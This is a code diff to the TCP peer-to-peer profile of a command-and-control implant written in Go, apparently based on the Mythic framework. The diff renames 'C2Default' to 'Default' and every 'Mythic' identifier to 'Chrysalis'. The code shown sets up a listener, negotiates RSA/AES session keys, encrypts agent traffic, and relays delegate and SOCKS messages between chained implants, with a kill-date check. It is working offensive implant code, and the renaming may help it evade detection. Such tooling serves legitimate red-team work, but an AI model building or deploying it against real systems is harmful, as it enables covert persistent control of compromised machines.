@@ -36,7 +36,7 @@ var encrypted_exchange_check string
 // AESPSK is the Crypto type
 var AESPSK string
 
-type C2Default struct {
+type Default struct {
 	ExchangingKeys       bool
 	Key                  string
 	RsaPrivateKey        *rsa.PrivateKey
@@ -52,7 +52,7 @@ func New() structs.Profile {
 	if err != nil {
 		os.Exit(1)
 	}
-	profile := C2Default{
+	profile := Default{
 		Key:                  AESPSK,
 		Port:                 port,
 		ExchangingKeys:       encrypted_exchange_check == "T",
@@ -62,7 +62,7 @@ func New() structs.Profile {
 	}
 	return &profile
 }
-func (c *C2Default) CheckForKillDate() {
+func (c *Default) CheckForKillDate() {
 	for true {
 		time.Sleep(time.Duration(10) * time.Second)
 		today := time.Now()
@@ -71,7 +71,7 @@ func (c *C2Default) CheckForKillDate() {
 		}
 	}
 }
-func (c *C2Default) Start() {
+func (c *Default) Start() {
 	// start listening
 	listen, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", c.Port))
 	if err != nil {
@@ -91,7 +91,7 @@ func (c *C2Default) Start() {
 		go c.handleClientConnection(conn)
 	}
 }
-func (c *C2Default) handleClientConnection(conn net.Conn) {
+func (c *Default) handleClientConnection(conn net.Conn) {
 	// this is a new client connection to this listening server
 	// first thing we want to do is save it off
 	connectionUUID := uuid.New().String()
@@ -108,7 +108,7 @@ func (c *C2Default) handleClientConnection(conn net.Conn) {
 		go c.CheckIn()
 	}
 }
-func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
+func (c *Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 	// These are normally formatted messages for our agent
 	// in normal base64 format with our uuid, parse them as such
 	var sizeBuffer uint32
@@ -174,13 +174,13 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 				}
 			}
 			if c.FinishedStaging {
-				taskResp := structs.MythicMessageResponse{}
+				taskResp := structs.ChrysalisMessageResponse{}
 				err = json.Unmarshal(enc_raw, &taskResp)
 				if err != nil {
-					fmt.Printf("Failed to unmarshal message into MythicResponse: %v\n", err)
+					fmt.Printf("Failed to unmarshal message into ChrysalisResponse: %v\n", err)
 				}
-				//fmt.Printf("Raw message from mythic: %s\n", string(enc_raw))
-				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+				//fmt.Printf("Raw message from chrysalis: %s\n", string(enc_raw))
+				HandleInboundChrysalisMessageFromEgressP2PChannel <- taskResp
 			} else {
 				if c.ExchangingKeys {
 					// this will be our response to the initial staging message
@@ -195,7 +195,7 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 					checkinResp := structs.CheckInMessageResponse{}
 					err = json.Unmarshal(enc_raw, &checkinResp)
 					if checkinResp.Status == "success" {
-						SetMythicID(checkinResp.ID)
+						SetChrysalisID(checkinResp.ID)
 						c.FinishedStaging = true
 					} else {
 						fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
@@ -207,12 +207,12 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 	}
 }
 
-func (c *C2Default) ProfileType() string {
+func (c *Default) ProfileType() string {
 	return "tcp"
 }
 
 // CheckIn - either a new agent or a new client connection, do the same for both
-func (c *C2Default) CheckIn() interface{} {
+func (c *Default) CheckIn() interface{} {
 	checkin := CreateCheckinMessage()
 
 	raw, err := json.Marshal(checkin)
@@ -224,7 +224,7 @@ func (c *C2Default) CheckIn() interface{} {
 
 }
 
-func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
+func (c *Default) FinishNegotiateKey(resp []byte) bool {
 	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
 
 	err := json.Unmarshal(resp, &sessionKeyResp)
@@ -233,7 +233,7 @@ func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
 		return false
 	}
 	if len(sessionKeyResp.UUID) > 0 {
-		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
+		SetChrysalisID(sessionKeyResp.UUID) // Save the new, temporary UUID
 	} else {
 		return false
 	}
@@ -245,7 +245,7 @@ func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
 }
 
 // NegotiateKey - EKE key negotiation
-func (c *C2Default) NegotiateKey() bool {
+func (c *Default) NegotiateKey() bool {
 	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
@@ -266,18 +266,18 @@ func (c *C2Default) NegotiateKey() bool {
 }
 
 // htmlPostData HTTP POST function
-func (c *C2Default) SendMessage(sendData []byte) interface{} {
+func (c *Default) SendMessage(sendData []byte) interface{} {
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.Key) != 0 {
 		//log.Printf("Encrypting Post data")
 		sendData = c.encryptMessage(sendData)
 	}
-	if GetMythicID() == "" {
+	if GetChrysalisID() == "" {
 		//fmt.Printf("prepending payload uuid\n")
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	} else {
-		//fmt.Printf("prepending %s\n", GetMythicID())
-		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
+		//fmt.Printf("prepending %s\n", GetChrysalisID())
+		sendData = append([]byte(GetChrysalisID()), sendData...) // Prepend the UUID
 	}
 	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
 	// Write the bytes out to the TCP connection, bytes.NewBuffer(sendData)
@@ -315,7 +315,7 @@ func (c *C2Default) SendMessage(sendData []byte) interface{} {
 		time.Sleep(200 * time.Millisecond)
 	}
 }
-func (c *C2Default) HandleDelegateMessageForInternalConnections(delegates []structs.DelegateMessage) {
+func (c *Default) HandleDelegateMessageForInternalConnections(delegates []structs.DelegateMessage) {
 	// got a message that needs to go to one of the c.InternalConnections
 	// parse the delegate message and then switch based on UUID
 	for i := 0; i < len(delegates); i++ {
@@ -324,23 +324,23 @@ func (c *C2Default) HandleDelegateMessageForInternalConnections(delegates []stru
 			_, err := conn.Write([]byte(delegates[i].Message))
 			if err != nil {
 				fmt.Printf("Failed to write to delegate connection: %v\n", err)
-				// need to remove the connection and send a message back to Mythic about it
+				// need to remove the connection and send a message back to Chrysalis about it
 			}
 		}
 	}
 	return
 }
-func (c *C2Default) CreateMessagesForEgressConnections() {
+func (c *Default) CreateMessagesForEgressConnections() {
 	// got a message that needs to go to one of the c.ExternalConnection
 	for {
-		msg := CreateMythicMessage()
+		msg := CreateChrysalisMessage()
 
 		if msg.Delegates != nil || msg.Socks != nil || msg.Responses != nil || msg.Edges != nil {
-			//fmt.Printf("Checking to see if there's anything to send to Mythic:\n%v\n", msg)
+			//fmt.Printf("Checking to see if there's anything to send to Chrysalis:\n%v\n", msg)
 			// we need to get this message ready to send
 			raw, err := json.Marshal(msg)
 			if err != nil {
-				fmt.Printf("Failed to marshal message to Mythic: %v\n", err)
+				fmt.Printf("Failed to marshal message to Chrysalis: %v\n", err)
 				continue
 			}
 			//fmt.Printf("Sending message outbound to http: %v\n", msg)
@@ -350,7 +350,7 @@ func (c *C2Default) CreateMessagesForEgressConnections() {
 	}
 }
 
-func (c *C2Default) RemoveEgressTCPConnection(connectionUUID string) bool {
+func (c *Default) RemoveEgressTCPConnection(connectionUUID string) bool {
 	if conn, ok := c.EgressTCPConnections[connectionUUID]; ok {
 		conn.Close()
 		delete(c.EgressTCPConnections, connectionUUID)
@@ -359,7 +359,7 @@ func (c *C2Default) RemoveEgressTCPConnection(connectionUUID string) bool {
 	return false
 }
 
-func (c *C2Default) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
+func (c *Default) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
 	for connectionUUID, conn := range c.EgressTCPConnections {
 		if connection.RemoteAddr().String() == conn.RemoteAddr().String() {
 			// found the match, remove it and break
@@ -370,24 +370,24 @@ func (c *C2Default) RemoveEgressTCPConnectionByConnection(connection net.Conn) b
 	return false
 }
 
-func (c *C2Default) encryptMessage(msg []byte) []byte {
+func (c *Default) encryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesEncrypt(key, msg)
 }
 
-func (c *C2Default) decryptMessage(msg []byte) []byte {
+func (c *Default) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
 }
 
-func (c *C2Default) SetSleepInterval(interval int) string {
+func (c *Default) SetSleepInterval(interval int) string {
 	return fmt.Sprintf("Sleep interval not used for TCP P2P Profile\n")
 }
 
-func (c *C2Default) SetSleepJitter(jitter int) string {
+func (c *Default) SetSleepJitter(jitter int) string {
 	return fmt.Sprintf("Sleep Jitter not used for TCP P2P Profile\n")
 }
 
-func (c *C2Default) GetSleepTime() int {
+func (c *Default) GetSleepTime() int {
 	return 0
 }
